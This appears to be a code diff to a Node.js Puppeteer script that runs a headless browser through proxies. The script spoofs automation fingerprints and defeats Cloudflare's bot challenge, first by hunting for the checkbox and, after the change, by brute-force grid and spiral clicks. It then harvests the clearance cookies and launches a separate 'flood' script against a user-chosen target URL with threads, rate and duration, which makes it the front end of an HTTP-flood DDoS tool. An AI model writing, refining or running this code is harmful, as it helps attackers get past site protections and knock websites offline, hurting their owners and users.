@@ -13,34 +13,13 @@ const COLORS = {
     RESET: '\x1b[0m'
 };
 
-// Enhanced stealth configuration
+// Simple stealth
 const applyStealth = async (page) => {
     await page.evaluateOnNewDocument(() => {
         Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-        Object.defineProperty(navigator, 'plugins', {
-            get: () => [
-                {
-                    name: 'Chrome PDF Plugin',
-                    filename: 'internal-pdf-viewer',
-                    description: 'Portable Document Format'
-                }
-            ]
-        });
-        
-        Object.defineProperty(navigator, 'languages', {
-            get: () => ['en-US', 'en']
-        });
-
-        window.chrome = {
-            runtime: {},
-            loadTimes: () => ({}),
-            csi: () => ({}),
-            app: { isInstalled: false }
-        };
-
+        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
+        window.chrome = { runtime: {}, loadTimes: () => ({}) };
         delete window.__webdriver_evaluate;
-        delete window.__selenium_evaluate;
-        delete window.__webdriver_script_function;
     });
 };
 
@@ -48,188 +27,143 @@ const getBrowserArgs = () => [
     '--no-sandbox',
     '--disable-setuid-sandbox',
     '--disable-dev-shm-usage',
-    '--disable-accelerated-2d-canvas',
-    '--disable-gpu',
     '--disable-blink-features=AutomationControlled',
     '--ignore-certificate-errors',
     '--ignore-ssl-errors',
     '--disable-web-security',
-    '--disable-features=site-per-process',
     '--window-size=1920,1080'
 ];
 
-// CLOUDFLARE SOLVER - SPECIFIC FOR CHECKBOX AFTER VERIFYING
-const solveCloudflare = async (page, proxy, targetURL) => {
-    log('INFO', `Processing ${maskProxy(proxy)}`, 'BLUE');
+// FULL SCREEN CLICK SOLVER - CLICKS EVERYWHERE
+const solveWithFullScreenClicks = async (page, proxy, targetURL) => {
+    log('SOLVER', `Starting full screen click solver for ${maskProxy(proxy)}`, 'BLUE');
     
-    // Wait for initial page load
     await sleep(3);
     
     let title = await page.title().catch(() => '');
-    let currentUrl = page.url();
     
-    // Check if already passed
     if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-        log('SUCCESS', 'Challenge passed', 'GREEN');
+        log('SUCCESS', 'Already bypassed!', 'GREEN');
         return { solved: true };
     }
 
-    log('INFO', 'Challenge detected - Title: ' + title, 'YELLOW');
+    log('INFO', 'Cloudflare challenge detected', 'YELLOW');
 
-    // PHASE 1: Wait for "Verifying..." phase (15 seconds)
-    log('PHASE 1', 'Waiting for Verifying... (15 seconds)', 'BLUE');
-    await sleep(15);
+    // Wait for verification
+    log('PHASE 1', 'Waiting for verification (10 seconds)', 'BLUE');
+    await sleep(10);
 
-    // PHASE 2: Now look for the specific checkbox that appears
-    log('PHASE 2', 'Looking for verification checkbox...', 'BLUE');
+    // Check if auto-solved
+    title = await page.title().catch(() => '');
+    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+        log('SUCCESS', 'Auto-verification successful!', 'GREEN');
+        return { solved: true };
+    }
+
+    // FULL SCREEN CLICKING STRATEGY
+    log('PHASE 2', 'Starting full screen clicking', 'BLUE');
     
-    let checkboxClicked = false;
-    let maxWaitTime = 30000; // 30 seconds max wait for checkbox
-    let startTime = Date.now();
+    const viewport = page.viewport();
+    const width = viewport.width;
+    const height = viewport.height;
     
-    while (!checkboxClicked && (Date.now() - startTime) < maxWaitTime) {
-        const frames = await page.frames();
+    log('DEBUG', `Screen size: ${width}x${height}`, 'YELLOW');
+
+    // Define grid density - adjust based on need
+    const gridSizes = [20, 15, 10]; // Start with coarse grid, then finer
+    
+    for (const gridSize of gridSizes) {
+        log('CLICK', `Clicking with ${gridSize}x${gridSize} grid`, 'YELLOW');
         
-        for (const frame of frames) {
-            try {
-                const frameUrl = frame.url();
-                if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
-                    log('DEBUG', 'Found challenge frame', 'YELLOW');
+        const xStep = Math.floor(width / gridSize);
+        const yStep = Math.floor(height / gridSize);
+        
+        let clickedPositions = 0;
+        
+        // Click every grid position
+        for (let x = 50; x < width - 50; x += xStep) {
+            for (let y = 50; y < height - 50; y += yStep) {
+                try {
+                    await page.mouse.click(x, y, { delay: 10 });
+                    clickedPositions++;
                     
-                    // Look for ANY checkbox element - broad search
-                    const checkboxSelectors = [
-                        'input[type="checkbox"]',
-                        '[type="checkbox"]',
-                        '.checkbox',
-                        '.cf-challenge-checkbox',
-                        '[role="checkbox"]',
-                        '#checkbox',
-                        '#cf-challenge-checkbox',
-                        '.hcaptcha-checkbox',
-                        '.recaptcha-checkbox',
-                        '.challenge-form input',
-                        '[aria-label*="checkbox"]',
-                        '[id*="checkbox"]',
-                        'div[class*="checkbox"]',
-                        'span[class*="checkbox"]',
-                        'label[class*="checkbox"]'
-                    ];
-                    
-                    for (const selector of checkboxSelectors) {
-                        try {
-                            // Wait for selector with shorter timeout
-                            await frame.waitForSelector(selector, { timeout: 2000 }).catch(() => {});
-                            const elements = await frame.$$(selector);
-                            
-                            for (const element of elements) {
-                                try {
-                                    const isVisible = await element.isIntersectingViewport();
-                                    const isEnabled = await element.isEnabled();
-                                    
-                                    if (isVisible && isEnabled) {
-                                        log('SUCCESS', `Found checkbox with selector: ${selector}`, 'GREEN');
-                                        
-                                        // Get element info for debugging
-                                        const elementInfo = await frame.evaluate(el => {
-                                            return {
-                                                tagName: el.tagName,
-                                                className: el.className,
-                                                id: el.id,
-                                                type: el.type,
-                                                role: el.getAttribute('role')
-                                            };
-                                        }, element);
-                                        
-                                        log('DEBUG', `Checkbox info: ${JSON.stringify(elementInfo)}`, 'YELLOW');
-                                        
-                                        // Click the checkbox
-                                        await element.click({ delay: 100 });
-                                        log('SUCCESS', 'Checkbox clicked successfully!', 'GREEN');
-                                        checkboxClicked = true;
-                                        
-                                        // PHASE 3: Wait for redirect to main website
-                                        log('PHASE 3', 'Waiting for redirect to main website (15 seconds)', 'BLUE');
-                                        await sleep(15);
-                                        
-                                        // Check if we're on main website now
-                                        title = await page.title().catch(() => '');
-                                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-                                            log('SUCCESS', 'Successfully redirected to main website!', 'GREEN');
-                                            return { solved: true };
-                                        }
-                                        break;
-                                    }
-                                } catch (error) {
-                                    // Continue to next element
-                                }
-                            }
-                            if (checkboxClicked) break;
-                        } catch (error) {
-                            // Continue to next selector
+                    // Check every 10 clicks if solved
+                    if (clickedPositions % 10 === 0) {
+                        title = await page.title().catch(() => '');
+                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+                            log('SUCCESS', `Solved after ${clickedPositions} clicks!`, 'GREEN');
+                            return { solved: true };
                         }
                     }
                     
-                    // If no checkbox found, try to find any clickable element
-                    if (!checkboxClicked) {
-                        log('INFO', 'No checkbox found, looking for any clickable element...', 'YELLOW');
-                        const clickableSelectors = [
-                            'button',
-                            'input[type="submit"]',
-                            '.btn',
-                            '.button',
-                            '[role="button"]',
-                            '[onclick]',
-                            '.verify-btn',
-                            '.success.button',
-                            '.challenge-form button'
-                        ];
-                        
-                        for (const selector of clickableSelectors) {
-                            const elements = await frame.$$(selector);
-                            for (const element of elements) {
-                                const isVisible = await element.isIntersectingViewport();
-                                if (isVisible) {
-                                    await element.click({ delay: 100 }).catch(() => {});
-                                    log('INFO', `Clicked element: ${selector}`, 'YELLOW');
-                                    await sleep(15);
-                                    
-                                    title = await page.title().catch(() => '');
-                                    if (!title.includes('Just a moment')) {
-                                        log('SUCCESS', 'Click successful!', 'GREEN');
-                                        return { solved: true };
-                                    }
-                                    break;
-                                }
-                            }
-                        }
-                    }
+                    // Small delay between clicks
+                    await sleep(0.1);
                     
-                    break;
+                } catch (error) {
+                    // Continue if click fails
                 }
-            } catch (error) {
-                // Continue to next frame
             }
         }
         
-        // If checkbox not found yet, wait a bit and try again
-        if (!checkboxClicked) {
-            await sleep(2000);
-            log('INFO', 'Still looking for checkbox...', 'YELLOW');
+        log('INFO', `Completed ${gridSize}x${gridSize} grid - ${clickedPositions} clicks`, 'YELLOW');
+        
+        // Check after each grid
+        title = await page.title().catch(() => '');
+        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+            log('SUCCESS', `Solved with ${gridSize}x${gridSize} grid!`, 'GREEN');
+            return { solved: true };
+        }
+        
+        // Wait a bit before next grid
+        await sleep(2);
+    }
+
+    // SPIRAL CLICKING PATTERN as last resort
+    log('PHASE 3', 'Trying spiral clicking pattern', 'BLUE');
+    
+    const centerX = width / 2;
+    const centerY = height / 2;
+    const maxRadius = Math.min(width, height) / 2 - 100;
+    
+    for (let radius = 0; radius <= maxRadius; radius += 50) {
+        for (let angle = 0; angle < 360; angle += 30) {
+            const rad = angle * (Math.PI / 180);
+            const x = centerX + radius * Math.cos(rad);
+            const y = centerY + radius * Math.sin(rad);
+            
+            if (x > 50 && x < width - 50 && y > 50 && y < height - 50) {
+                try {
+                    await page.mouse.click(x, y, { delay: 10 });
+                    
+                    // Check periodically
+                    if (radius % 100 === 0 && angle === 0) {
+                        title = await page.title().catch(() => '');
+                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
+                            log('SUCCESS', `Solved with spiral click!`, 'GREEN');
+                            return { solved: true };
+                        }
+                    }
+                    
+                    await sleep(0.05);
+                } catch (error) {
+                    // Continue
+                }
+            }
         }
     }
 
     // Final check
     title = await page.title().catch(() => '');
     if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
-        log('SUCCESS', 'Challenge passed in final check', 'GREEN');
+        log('SUCCESS', 'Challenge solved!', 'GREEN');
         return { solved: true };
     }
 
-    log('ERROR', 'Failed to find and click checkbox', 'RED');
+    log('ERROR', 'Full screen clicking failed', 'RED');
     return { solved: false };
 };
 
-// Extract Cloudflare cookies
+// Extract cookies
 const extractCookies = async (page, targetURL) => {
     await sleep(5);
     
@@ -240,14 +174,13 @@ const extractCookies = async (page, targetURL) => {
         return { cookies: '', count: 0, names: [] };
     }
 
-    // Filter Cloudflare cookies
     const cloudflareCookies = allCookies.filter(cookie => 
         cookie.name.includes('cf_') ||
         cookie.name.includes('__cf') ||
         cookie.domain.includes('cloudflare')
     );
 
-    log('COOKIES', `Total cookies found: ${allCookies.length}`, 'GREEN');
+    log('COOKIES', `Total cookies: ${allCookies.length}`, 'GREEN');
     
     if (cloudflareCookies.length > 0) {
         const cloudflareNames = cloudflareCookies.map(c => c.name).join(', ');
@@ -265,10 +198,9 @@ const extractCookies = async (page, targetURL) => {
     }
 };
 
-// Command-line setup
+// Command-line
 if (process.argv.length < 6) {
     console.log('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
-    console.log('Example: node browser.js https://example.com 2 proxies.txt 10 120');
     process.exit(1);
 }
 
@@ -286,7 +218,7 @@ const generateRandomString = (length) => {
     return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
 };
 
-const validKey = generateRandomString(12);
+const validKey = generateRandomString(16);
 
 const readProxies = (filePath) => {
     try {
@@ -352,28 +284,25 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
 
         log('NAVIGATE', `Going to: ${targetURL}`, 'BLUE');
         
-        // Navigate to target
         await page.goto(targetURL, { 
             waitUntil: 'networkidle0', 
             timeout: 60000 
         }).catch(() => {});
 
-        // Solve Cloudflare challenge
-        const solveResult = await solveCloudflare(page, proxy, targetURL);
+        const solveResult = await solveWithFullScreenClicks(page, proxy, targetURL);
         
         if (!solveResult.solved) {
             throw new Error('Cloudflare challenge failed');
         }
 
-        // Extract cookies
         const cookieResult = await extractCookies(page, targetURL);
         
         successCount++;
         
         if (cookieResult.count > 0) {
-            log('SUCCESS', `Solved! Cloudflare cookies: ${cookieResult.count} (${cookieResult.names.join(', ')})`, 'GREEN');
+            log('SUCCESS', `Solved! Cookies: ${cookieResult.count}`, 'GREEN');
         } else {
-            log('WARNING', 'Solved but no Cloudflare cookies found', 'YELLOW');
+            log('WARNING', 'Solved but no cookies found', 'YELLOW');
         }
 
         await browser.close();
@@ -381,8 +310,7 @@ const launchBrowser = async (targetURL, proxy, attempt = 1) => {
         return {
             cookies: cookieResult.cookies,
             userAgent: userAgent,
-            cookieCount: cookieResult.count,
-            cookieNames: cookieResult.names
+            cookieCount: cookieResult.count
         };
 
     } catch (error) {
@@ -409,20 +337,18 @@ const main = async () => {
     }
 
     log('START', `Target: ${targetURL}`, 'GREEN');
-    log('INFO', `Using 1 proxy for testing | Threads: ${threads} | Time: ${duration}s`, 'BLUE');
+    log('INFO', `Using 1 proxy | Threads: ${threads} | Time: ${duration}s`, 'BLUE');
 
-    // Process only the first proxy
     const proxy = proxies[0];
     
     try {
         const result = await launchBrowser(targetURL, proxy);
         
         if (result && result.cookies) {
-            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} Cloudflare cookies`, 'GREEN');
+            log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies`, 'GREEN');
             
-            // Launch flood process with Cloudflare cookies
             try {
-                log('FLOOD', `Starting flood process with ${threads} threads, rate ${rate} for ${duration}s`, 'GREEN');
+                log('FLOOD', `Starting flood with ${threads} threads for ${duration}s`, 'GREEN');
                 const floodProcess = spawn('node', [
                     'floodbrs.js',
                     targetURL,
@@ -447,7 +373,7 @@ const main = async () => {
                 log('ERROR', `Failed to start flood: ${error.message}`, 'RED');
             }
         } else {
-            log('ERROR', 'No Cloudflare cookies obtained', 'RED');
+            log('ERROR', 'No cookies obtained', 'RED');
         }
     } catch (error) {
         log('ERROR', error.message, 'RED');
@@ -468,7 +394,7 @@ process.on('SIGINT', () => {
     process.exit(0);
 });
 
-log('READY', 'Cloudflare Checkbox Solver - Waiting for Verification then Clicking Checkbox', 'GREEN');
+log('READY', 'FULL SCREEN CLICK SOLVER - CLICKS EVERYWHERE', 'GREEN');
 main().catch(error => {
     log('ERROR', error.message, 'RED');
     process.exit(1);
